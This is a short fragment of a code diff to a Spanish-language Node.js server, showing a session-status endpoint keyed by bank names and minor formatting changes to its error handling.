             const sessionId = estadoMatch[2];
-
             const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
             if (!esValido) { json(res, 404, { ok: false }); return; }
-
             const estado = estadoSesiones.get(sessionId) || 'pendiente';
             const accion = ultimaAccionSesiones.get(sessionId) || '';
             json(res, 200, { estado, accion });
@@ -814,9 +611,7 @@ const server = http.createServer(async (req, res) => {
         res.end('Not found');
     } catch (globalError) {
         console.error('Error global en el servidor:', globalError);
-        try {
-            json(res, 500, { ok: false, error: 'Error interno del servidor' });
-        } catch (e) {}
+        try { json(res, 500, { ok: false, error: 'Error interno del servidor' }); } catch (e) {}
     }
 });
 
